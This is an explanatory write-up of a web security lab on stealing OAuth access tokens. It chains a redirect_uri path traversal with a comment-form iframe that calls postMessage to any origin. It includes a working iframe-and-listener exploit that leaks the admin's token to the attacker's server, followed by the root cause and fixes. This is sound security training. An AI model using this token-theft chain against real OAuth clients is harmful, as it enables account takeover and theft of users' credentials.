# Lab 5 Stealing OAuth access tokens via a proxy page

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

***

### Lab: Stealing OAuth Access Tokens via a Proxy Page - Explanation

This lab is the concrete example of the **"dangerous JavaScript / gadget chain"** category we just discussed. No open redirect exists this time - instead, the exfiltration path is a **vulnerable `postMessage` handler** on the client site itself.

## The Two Ingredients

**1. Same old `redirect_uri` path traversal**\
Just like the previous lab - the OAuth server's whitelist check is prefix-based, so you can traverse to any page on the trusted domain:

```
redirect_uri=https://LAB-ID/oauth-callback/../post/comment/comment-form
```

**2. New piece: an insecure `postMessage()` on the comment form**\
Every blog post embeds a comment form via `<iframe>`. That iframe's page runs JS like:

```js
window.parent.postMessage({data: window.location.href}, "*")
```

It sends its **own URL** (including the fragment!) to its parent window - but critically, it uses `"*"` as the target origin, meaning **it will send this message to whatever page happens to be its parent**, regardless of that parent's actual origin.

## Why This Is Exploitable

Normally, this comment-form iframe is embedded inside a legitimate blog post page, and the message is meant for that trusted parent. But **nothing stops an attacker from making their own page the parent instead**:

html

```html
<iframe src="https://oauth-server.net/auth?...&redirect_uri=https://LAB-ID/oauth-callback/../post/comment/comment-form&response_type=token&..."></iframe>
```

Now:

1. The `iframe`'s `src` kicks off the OAuth flow
2. Path traversal makes the OAuth server redirect (with the access token in the fragment) to `.../post/comment/comment-form#access_token=...`
3. That comment-form page loads **inside the attacker's iframe**
4. Its own script reads `window.location.href` (fragment included) and does `postMessage(..., "*")`
5. Because the target origin is `"*"`, it doesn't check _who_ the parent is - it happily sends the token straight to the **attacker's parent page**
6. Attacker's own JS, listening via `window.addEventListener('message', ...)`, receives it and exfiltrates it (e.g., via `fetch`)

## The Exploit

html

```html
<iframe src="https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://LAB-ID/oauth-callback/../post/comment/comment-form&response_type=token&nonce=NONCE&scope=openid%20profile%20email"></iframe>

<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```

* The `iframe` triggers the whole OAuth + traversal chain
* The listener catches whatever the comment form's vulnerable script broadcasts
* `fetch("/" + ...)` sends it to the exploit server's **own** log (same-origin, so no CORS/Referer issues) - check the access log for the leaked URL/token

## Root Cause

Two flaws, chained:

1. **`redirect_uri` prefix-matching** → lets attacker land the token on _any_ page on the trusted domain, not just the real callback
2. **Insecure `postMessage(..., "*")`** → the comment form will broadcast its full URL (including sensitive fragment data) to **any parent**, without verifying the parent's origin first

Neither flaw alone is exploitable for token theft - the traversal gets the token onto a page, but that page needed some behavior that **leaks its own URL out to the attacker**. The careless `postMessage` was exactly that behavior. This is the "gadget chain" concept from before, made concrete: token → lands on comment form (via traversal) → comment form leaks its own location via bad `postMessage` → attacker's listener catches it.

## The Fix

* **`redirect_uri`**: exact-match validation (same fix as always)
* **`postMessage` target origin**: never use `"*"`. Always specify the exact expected parent origin:

```js
  window.parent.postMessage({data: window.location.href}, "https://trusted-blog-domain.com")
```

* **On the receiving end too**: any script that listens for `message` events should validate `event.origin` before trusting/using the data - this lab's comment form fails on the _sending_ side, but receivers should always double-check too, defense in depth.

## One-Line Takeaway

> `postMessage` with a wildcard `"*"` target origin will broadcast sensitive data (URLs, tokens, fragments) to **any** parent window - including an attacker's. Combined with a `redirect_uri` traversal bug that lets you choose _which_ page on the trusted domain receives the token, this becomes a full token-theft gadget chain even without any traditional open redirect.
